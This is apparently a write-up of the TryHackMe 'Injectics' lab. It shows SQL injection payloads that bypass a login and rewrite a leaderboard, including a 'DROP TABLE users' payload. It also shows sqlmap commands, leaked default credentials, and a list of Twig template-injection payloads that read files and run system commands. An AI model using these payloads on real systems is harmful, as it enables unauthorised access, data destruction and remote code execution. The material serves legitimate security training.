# Injectics

{% embed url="https://tryhackme.com/room/injectics" %}

### Initial enumeration

#### Basic fuzzing:

{% code overflow="wrap" %}
```bash
$ gobuster dir -u http://<target> -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
```
{% endcode %}

...

Interesting files: `composer.lock`, `composer.json`

From `composer.json`, I found out that the application uses Twig.

#### Source code review

... found file `mail.log`&#x20;

```
From: dev@injectics.thm
To: superadmin@injectics.thm
Subject: Update before holidays

Hey,

Before heading off on holidays, I wanted to update you on the latest changes to the website. I have implemented several enhancements and enabled a special service called Injectics. This service continuously monitors the database to ensure it remains in a stable state.

To add an extra layer of safety, I have configured the service to automatically insert default credentials into the `users` table if it is ever deleted or becomes corrupted. This ensures that we always have a way to access the system and perform necessary maintenance. I have scheduled the service to run every minute.

Here are the default credentials that will be added:

| Email                     | Password 	              |
|---------------------------|-------------------------|
| superadmin@injectics.thm  | superSecurePasswd101    |
| dev@injectics.thm         | devPasswd123            |

Please let me know if there are any further updates or changes needed.

Best regards,
Dev Team

dev@injectics.thm

```

From this note, we can understand that ...

### Exploring the application

#### (1) Normal user login

Using the GUI to test the payload `'` returns an error message. Looking at the sources, I found a file `script.js` that works to block a few keywords. Thus, I used Burp suite to send the API request directly to the server instead.

_**script.js**_:

```javascript
$("#login-form").on("submit", function(e) {
    e.preventDefault();
    var username = $("#email").val();
    var password = $("#pwd").val();

	const invalidKeywords = ['or', 'and', 'union', 'select', '"', "'"];
            for (let keyword of invalidKeywords) {
                if (username.includes(keyword)) {
                    alert('Invalid keywords detected');
                   return false;
                }
            }

    $.ajax({
        url: 'functions.php',
        type: 'POST',
        data: {
            username: username,
            password: password,
            function: "login"
        },
        dataType: 'json',
        success: function(data) {
            if (data.status == "success") {
                if (data.auth_type == 0){
                    window.location = 'dashboard.php';
                }else{
                    window.location = 'dashboard.php';
                }
            } else {
                $("#messagess").html('<div class="alert alert-danger" role="alert">' + data.message + '</div>');
            }
        }
    });
});

```

```http
POST /functions.php HTTP/1.1

Host: ...
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 57
Origin: http://...
Connection: keep-alive
Referer: http://10.10.244.88/login.php?mail=t&pass=t
Cookie: PHPSESSID=oqttvasr6crs86ila4mi3kbjf6
Priority: u=0

username=1&password=1&function=login
```

**Possible SQL query:**

```sql
SELECT * FROM table WHERE username = x AND password = x 
```

Injection to `username` POST field:

```sql
'||1=1;-- //there is an explicit space right after the comment (--)
```



* This works with space in between the items too:&#x20;

```
' || 1=1;-- 
```

`' || 1=1; --`&#x20;

```sql
SELECT * FROM table WHERE username = ''||1=1'-- AND password = '1' 
```

**Further learning**

* To explore what other injection methods can be used, I utilized Sqlmap:&#x20;

> `login.txt` contains the HTTP POST request from above

```sh
$ sqlmap -r login.txt --risk=3 --level=5
```

I found that the following payload to the username field works too:

```sql
' RLIKE SLEEP(3) -- n 
```

#### (2) Edit leader board

After the successful injection on the login form, we are able to view the dashboard page, which presents us with a method to edit the leader board table:

```http
POST /edit_leaderboard.php HTTP/1.1
Host: 10.10.244.88
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 43
Origin: http://10.10.175.148
Connection: keep-alive
Referer: http://10.10.175.148/edit_leaderboard.php?rank=1&country=USA
Cookie: PHPSESSID=4rtpdvbsmkvqquno4am9ij5h6q
Upgrade-Insecure-Requests: 1
Priority: u=0, i

rank=1&country=1&gold=1&silver=1&bronze=1
```

**Possible SQL query:**

```sql
UPDATE table SET gold = x, silver = x, bronze = x WHERE rank = x;
```

**ATTEMPT 1**

Injection to the `gold` field:

```sql
22, silver = 22, bronze = 22;-- // explicit space after comment
```

```sql
UPDATE table SET gold = 22, silver = 22, bronze = 22;--, silver = x, bronze = x WHERE id = 'x';; 
```

* This action will update the `gold`, `silver` and `bronze` field to **22** for every country. With that, we know that the SQL injection worked!

**ATTEMPT 2**

```sql
1 WHERE 1=1; DROP TABLE users;-- 
```

{% code overflow="wrap" %}
```sql
UPDATE table SET gold = 1 WHERE 1=1; DROP TABLE users;-- , bronze = x WHERE id = x;, silver = x, bronze = x WHERE id = x;

```
{% endcode %}

**Further learning**

Sqlmap:&#x20;

```sh
$ sqlmap -r leaderboard.txt -p gold,silver,bronze --dbms=mysql 
```

### SSTI injection on the admin profile page

The following displays the request to update the admin profile page (Burp suite):

```http
POST /update_profile.php HTTP/1.1
Host: 10.10.82.58
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 84
Origin: http://10.10.124.140
Connection: keep-alive
Referer: http://10.10.124.140/update_profile.php
Cookie: PHPSESSID=ce44rfksrc4ecbo5pkfgrje229
Upgrade-Insecure-Requests: 1
Priority: u=0, i

email=superadmin%40injectics.thm&fname=t&lname=t
```

Upon updating the `fname` field, it appears that the value is reflected on the profile page.

#### Twig SSTI injection

#### Identifying vulnerability to SSTI

Using the simple test value of `{{7*7}}` shows the value `49` displayed. This shows that the application is vulnerable.

From the `composer.json` file, we know that the application uses _**Twig**_ as the server-side template engine.

I tried a few payloads I have found from multiple sources (refer to references below):

**File read**

```twig
{{['cat index.php']|map('system')|join}} 
"{{'index.php'|file_excerpt(1,30)}}"@ 
```

**Code execution**

```twig
{{['id']|map('shell')|join}}
{{['id']|map('system')|join}}
{{['id']|map('passthru')|join}}
{{['id']|map('shell')}}
{{['id']|map('system')}}
{{['id']|map('passthru')}}

{{['id']|filter('shell')}} 
{{['id']|filter('system')}} 
{{['id']|filter('passthru')}} 

{{['id',""]|sort('shell')}} 
{{['id',""]|sort('system')}} 
{{['id',""]|sort('passthru')}} 
```

The payloads above doesn't seem to work. Finally, the following finally worked after a few iterations:

```twig
{{['id',""]|sort('passthru')}} 
```

{% embed url="https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/index.html#ssti-in-go" %}

{% embed url="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/PHP.md" %}
